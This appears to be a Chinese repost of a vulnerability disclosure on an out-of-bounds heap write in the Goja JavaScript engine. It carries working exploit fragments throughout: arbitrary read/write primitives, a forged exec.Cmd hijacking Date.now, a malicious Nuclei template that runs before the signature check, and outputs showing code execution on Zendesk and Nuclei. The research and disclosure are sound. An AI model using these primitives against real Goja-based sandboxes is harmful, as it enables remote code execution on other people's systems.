#  沙箱之外：Goja 引擎越界写漏洞与 Zendesk、Nuclei 任意代码执行  
 幻泉之洲   2026-09-22 02:35  
  
>   
  
## 开场：一个值得盯的靶子  
  
最近一段时间我们审了不少 JavaScript 沙箱。倒不是专门去找，实在是它们总出现在各类软件里——SaaS 厂商想给用户写代码做自动化，但共享环境下又不能交出完整控制权，于是塞进去一个 JS 引擎，套上层壳，就敢对用户说"来写吧"。  
  
这类目标对我们来说很有意思。JavaScript 是一门完整的编程语言，攻击面天然很大，一旦从沙箱里爬出去，影响通常很严重。这次的主角是 Goja，GitHub 地址是 https://github.com/dop251/goja。它完全用 Go 实现，被 k6、PocketBase、Nuclei 和 Zendesk 这些产品嵌入在内部。  
  
我们最终利用 Goja 的一处越界堆写入漏洞，在 Zendesk 和 Nuclei 上都打出了任意代码执行。Zendesk 的场景是认证后的 action flows 功能；Nuclei 则是运行含恶意 JavaScript 的未签名模板时触发。两家厂商已经合了补丁，我们建议所有依赖 Goja 且允许不可信用户执行 JS 的应用尽快升级。  
## 漏洞本身：一个算错的偏移  
  
问题出在 TypedArray 的两个方法——with  
 和 toReversed  
——的实现上。先给不了解的读者补一句：TypedArray 提供一种对底层数据缓冲的类数组视图。它没法直接创建，必须通过子类，比如 Int32Array 或 BigUint64Array。TypedArray 一个关键特性是创建时能指定偏移量。  
  
let buffer = new ArrayBuffer(8);  
  
let view1 = new Int32Array(buffer);  
  
let view2 = new Int32Array(buffer, 4); // create a view with a 4 byte offset  
  
view1[1] = 1337;  
  
  
// prints 1337 because view2 starts offset by 4 bytes (one int32)  
  
console.log(view2[0]);  
  
注意上面 view1[1] = 1337  
 这一句。view2 的起始位置比 view1 偏移了 4 字节（一个 Int32 的宽度），所以写 view1 的第二个元素，恰好写进了 view2 的第一个元素。这是 TypedArray 偏移机制的正常行为。  
  
bug 在 with  
 里。两个方法都是先拷贝 TypedArray 视图暴露的数据、再对拷贝做处理。我们只看 with  
，因为 toReversed  
 犯的是同一个错。  
  
func (r *Runtime) typedArrayProto_with(call FunctionCall) Value {  
  
    ...  
  
    // create the new array  
  
    a := r.typedArrayCreate(ta.defaultCtor, intToValue(int64(length)))  
  
    for k := 0; k < length; k++ {  
  
        ...  
  
        a.writeItem(k, value)  
  
    }  
  
}  
  
问题在 writeItem  
 里。这个函数往新数组的底层 buffer 写数据时，用的是 t.offset + index*t.elemSize  
 来定位。但 t.offset  
 是 0——因为这个 t  
 是新创建的数组，它没有继承原视图的偏移量。而 index 却源自原始视图的遍历下标。  
  
func (t *typedArrayObject) writeItem(index int, value Value) {  
  
    if index < 0 || index >= t.length {  
  
        panic("TypedArray.writeItem: index out of bounds")  
  
    }  
  
    t.viewed.arrayBuffer.data[t.offset+index*t.elemSize] = value.ToBigInt()  
  
}  
  
说得直白点：新数组的 data  
 字段指向原 buffer 的开头，但写入位置却按原视图的偏移继续往后数。一旦原视图有非零偏移，写入就会越过 buffer 边界，写到堆上的相邻内存。这就是越界写。  
  
边界检查确实存在，但检查的是 index  
 是否小于新数组的长度，而不是 index + 偏移  
 是否落在 buffer 范围内。第一层防线被自己绕过去了。  
## 把它变成任意读写  
  
越界写本身不能直接执行代码，得先把它转化成任意读写原语。思路不复杂：用两个 ArrayBuffer 紧挨着分配在堆上，让第一个 buffer 的越界写恰好打中第二个 buffer 的元数据。  
  
具体做法是构造一个带偏移的 TypedArray 视图，视图的底层 buffer 是第一个 ArrayBuffer，偏移量刚好让 with(0, value)  
 的写入落在第二个 ArrayBuffer 的 data  
 字段上。第二个 buffer 的 data  
 字段是一个指向底层字节数组的指针，把它改掉，就能让读写操作转向任意内存地址。  
  
用代码表达就是下面这个套路。  
  
let R = (addr) => {  
  
    wide_view[read_write_buffer_array_ptr] = BigInt(addr);  
  
    return read_write_view[0];  
  
}  
  
  
let W = (addr, value) => {  
  
    wide_view[read_write_buffer_array_ptr] = BigInt(addr);  
  
    read_write_view[0] = BigInt(value);  
  
}  
  
有了任意地址读写，下一步是劫持控制流。思路是改掉一个能从 JavaScript 调用的 Go 函数指针。选项有几个，我们选了 Date.now  
。  
  
得先找到 Date.now  
 在内存里的位置。把它赋给变量再去堆里翻也行，但更省事是把它作为参数传给函数调用，强制压到调用栈上，然后从已有数组出发走对象图，一路摸到 Goja VM 的调用栈。  
  
起点是第二个 ArrayBuffer。它有一个指向 data  
 字段的指针——就是上面 R/W 原语里用的那个。把指针往回退 96 字节，就能读到关联 JavaScript 对象的 val  
 字段。ArrayBuffer 的结构体长这样：  
  
type arrayBufferObject struct {  
  
    class             string  
  
    val               *Object // offset: 16 - the field we want to read  
  
    prototype         *Object  
  
    extensible        bool  
  
    values            map[unistring.String]Value  
  
    propNames         []unistring.String  
  
    lastSortedPropLen int  
  
    idxPropCount      int  
  
    symValues         *orderedMap  
  
    privateElements   map[*privateEnvType]*privateElements  
  
    detached          bool  
  
    data              []byte // offset: 112 - read_write_buffer_array_ptr points to this field  
  
}  
  
查 Go 结构体字段偏移可以用 structlayout 这个工具，地址是 https://github.com/dominikh/go-tools/blob/v0.7.0/cmd/structlayout/main.go。按这个路线走：  
1. arrayBufferObject 的 val *Object  
 在偏移 16  
  
1. Object 的 runtime *Runtime  
 在偏移 8  
  
1. Runtime 的 vm *vm  
 在偏移 872  
  
1. vm 的 stack []Value  
 在偏移 24  
  
把 Date.now  
 放进数组里方便在栈上搜索，然后调用一个函数把这个数组压栈。流程大概是：  
  
// walk object graph to find stack  
  
let valPtr = wide_view[read_write_buffer_array_ptr-12];  
  
let rtPtr = R(valPtr+8n);  
  
let vmPtr = R(rtPtr+872n);  
  
let stack = R(vmPtr+24n);  
  
let stackLen = Number(R(vmPtr+32n));  
  
  
// save Date.now so we can find it later  
  
let arr = [];  
  
for (let i = 0; i < 100; i++) arr.push(Date.now);  
  
// force the array onto the stack by calling a function  
  
someFunction(arr);  
  
找到 Date.now  
 的函数指针之后，难点在于把它盖成什么。Go 的调用约定和 C 不同，不能直接塞一个 execve  
 地址就了事。这里有两个选择。  
  
第一条路是用 ROP。利用任意读写把 ROP 链写进栈，再借 Date.now  
 被改掉的指针跳进 gadget。第二条路更直接：在堆上伪造一个 exec.Cmd  
 结构体，然后调用 (*Cmd).Run  
 方法。我们选了后者。  
  
先伪造 Cmd 结构体。Go 里字符串以 {ptr, len}  
 对表示，所以得把命令字符串、参数都按这个布局写在堆上。  
  
let sh = "/bin/sh -c 'id > /tmp/x'";  
  
let arg1 = "-c";  
  
let arg2 = "id > /tmp/x";  
  
let shBuf = scratch + 0x0n;  
  
let arg1Buf = scratch + 0x10n;  
  
let arg2Buf = scratch + 0x20n;  
  
WS(shBuf, sh);  
  
WS(arg1Buf, arg1);  
  
WS(arg2Buf, arg2);  
  
  
// write the `Args` slice, Go stores strings as a {ptr, len} pair  
  
let argv = scratch + 0x50n;  
  
W(argv + 0x00n, shBuf);  
  
W(argv + 0x08n, BigInt(sh.length));  
  
W(argv + 0x10n, arg1Buf);  
  
W(argv + 0x18n, BigInt(arg1.length));  
  
W(argv + 0x20n, arg2Buf);  
  
W(argv + 0x28n, BigInt(arg2.length));  
  
  
// write the `Cmd` struct  
  
let cmd = scratch + 0x100n;  
  
Z(cmd, 0x180);  
  
W(cmd + 0x00n, shBuf);     // path.ptr  
  
W(cmd + 0x08n, sh.length); // path.len  
  
W(cmd + 0x10n, argv);      // args.ptr  
  
W(cmd + 0x18n, 3n);        // args.len  
  
*Cmd.Run  
 的地址用 go tool nm 就能拿到：  
  
$ go tool nm ./sandbox-escape | grep '(*Cmd).Run'  
  
  515c20 T os/exec.(*Cmd).Run  
  
最后一步有个小技巧。Go 里 func (c *Cmd) Run()  
 等价于 func Run(c *Cmd)  
，接收者 c 通过 rax 寄存器传入。如果直接 Date.now(cmd)  
 调用，第一个参数会被当作 this  
（Date 对象），cmd 变成第二个参数。解决办法是用 Function.prototype.call  
 替换 this  
 值。Goja 对这个的实现正好能让替换后的 this  
 值落到 rax 里。  
  
let fn = Date.now;  
  
let cmdRunAddr = 0x515c20;  
  
W(arr_data, cmd);       // write the addr of the cmd struct to arr[0].tab  
  
W(arr_data + 8n, 0n);   // and zero arr[0].data to be safe  
  
W(funcVal, cmdRunAddr);  
  
fn.call(arr[0]);  
  
跑几次直到成功，命令如期执行：  
  
$ ./sandbox-escape  
  
found corrupted buffer  
  
found read/write buffer  
  
found stack array  
  
triggered Date.now  
  
$ cat /tmp/x  
  
uid=0(root) gid=0(root) groups=0(root)  
## Zendesk：受限环境里的持久战  
  
我们第一次撞见 Goja 就是在 Zendesk 上，也是整个研究项目的起点。Zendesk 给 Goja VM 加了内存和执行时间限制，超时或超内存直接被掐断。这意味着批量盲写和频繁检查损坏 buffer 的套路要缩水——可靠性下降，要么写入没打中，要么把关键内存踩了导致崩溃。  
  
一个实用的优化是减少 JavaScript 属性查找次数。每次 src.with(0, value)  
 都会触发一次属性解析，这背后是若干次从潜在坏地址读内存。改成先存引用再复用：  
  
let APPLY = Reflect.apply;  
  
let WITH = BigUint64Array.prototype.with;  
  
let ARGS = [0, value];  
  
APPLY(WITH, src, ARGS);  
  
这样 with  
 只需要查找一次。第二个问题是拿不到二进制文件。但 Go 编译通常不带 ASLR，第一个程序段几乎总是映射在 0x400000，里面有 ELF 头和 .text 段。用任意读写从 0x400000 慢慢读内存，凑够了就能离线找偏移。  
  
大量调试、无数次崩溃之后，工作利用链终于跑通了：  
  
$ python3 zendesk_rce_cmd.py --host "$TENANT.zendesk.com" "id"  
  
SUMMARY attempts=12 hits=1  
  
[cmd-output]  
  
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup),  
  
__EXIT:0  
  
12 次尝试成功 1 次，勉强能用。说实话，这种可靠性放在真实攻击里不算理想，但作为漏洞证明足够了。  
## Nuclei：一条更顺的路  
  
搞完 Zendesk，我们在网上翻其他用 Goja 的流行项目，特别是什么地方允许不可信用户跑 JavaScript。Nuclei 是 ProjectDiscovery 的漏洞扫描器，v3 开始支持用 JS 写检测逻辑。之前就有安全公告说旧版本能从不可信模板执行代码。如果我们写的模板能达成任意代码执行，那就算个正经漏洞。  
  
Nuclei 不允许用户跑未签名代码，但模板里有个 init  
 段——这段里的 JavaScript 会在签名校验之前执行。对我们来说简直是天时地利。  
  
下载最新的预编译版本 3.9.0，提取 *Cmd.Run  
 偏移，把沙箱逃逸代码塞进 init 段，模板长这样：  
  
id: goja-rce  
  
  
info:  
  
  name: goja-rce  
  
  author: researcher  
  
  severity: info  
  
  
javascript:  
  
  - init: |  
  
      {{sandbox escape}}  
  
    code: |  
  
      "noop";  
  
    matchers:  
  
      - type: word  
  
        words:  
  
          - "noop"  
  
跑几次之后命令照常执行了，和测试程序里的表现一致：  
  
$ ./nuclei -dut -target http://example.com -t ./exploit.yaml -v  
  
  
                     __     _  
  
   ____  __  _______/ /__  (_)  
  
  / __ \/ / / / ___/ / _ \/ /  
  
 / / / / /_/ / /__/ /  __/ /  
  
/_/ /_/\__,_/\___/_/\___/_/   v3.9.0  
  
  
        projectdiscovery.io  
  
  
[VER] Started metrics server at localhost:9092  
  
[VER] Saved 1 templates to metadata cache  
  
[WRN] Skipping 1 unsigned template[s]  
  
[INF] Current nuclei version: v3.9.0 (latest)  
  
[INF] Current nuclei-templates version: v10.4.5 (latest)  
  
[WRN] Scan results upload to cloud is disabled.  
  
[INF] Targets loaded for current scan: 1  
  
[INF] Scan completed in 652.805µs. No results found.  
  
[FTL] Could not run nuclei: no templates provided for scan  
  
$ cat /tmp/x  
  
uid=0(root) gid=0(root) groups=0(root)  
  
顺手还下了个 macOS 版 Nuclei 试了试。那边 ASLR 默认开启，比 Linux 麻烦一点，但堆地址仍然是固定的。Go 在 macOS 上链接 libSystem，里面打包了 libc，所以可以直接用一个 ROP gadget 跳到 system("open -a Calculator")  
，弹出计算器走人。  
## 这件事说清楚了什么  
  
一开始审一个 Go 写的 JS 引擎，真没指望撞见内存破坏。Go 是内存安全语言，这是共识。但 Go 还有一个特点：默认关 ASLR。这对开发者有好处，调试方便、崩溃好复现。Go 团队显然愿意接受这个风险——公平地说，Go 程序里内存破坏漏洞确实罕见，这个交换在多数场景下是划算的。  
  
然而，一旦代码里出现 unsafe  
，这笔账就得重算。如果你需要裸指针，或者用了 cgo，那还是把 ASLR 打开吧。再退一步想，有时候 unsafe  
 可能压根不用。即便开了 ASLR 也不是无懈可击，但比默认关闭强得多。要是连 unsafe  
 都不用，这个 bug 顶多触发个运行时 panic，而不是变成 RCE。  
  
我们六月中旬把问题报给了 Zendesk 和 Goja。Zendesk 几天内就提了 PR 并合入，响应速度相当不错。最后再强调一次：任何依赖 Goja 的应用，特别是拿它来沙箱不可信代码的，赶紧升到最新版。写 Go 代码的朋友，顺手搜一下 unsafe  
 的引用也没什么坏处。  
  
Linux 版的 JavaScript 利用代码和存在漏洞的 Nuclei 模板已经公开，地址是 https://github.com/assetnote/goja-heap-oob。其他平台的利用就留给读者自己玩了。  
### 参考资料  
  
[1]   
https://www.slcyber.io/research/out-of-bounds-out-of-sandbox-rce-goja  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibficuQh4hZHx0l0efdibiatYA8jF1icN09lPPXicu7mJQIIunBtbkjLbLgKbiaJNh3zDJFYSstj8GbjojkTGebQobb9LXqHfu9mowgiaM/640?wx_fmt=jpeg "")  
  
  
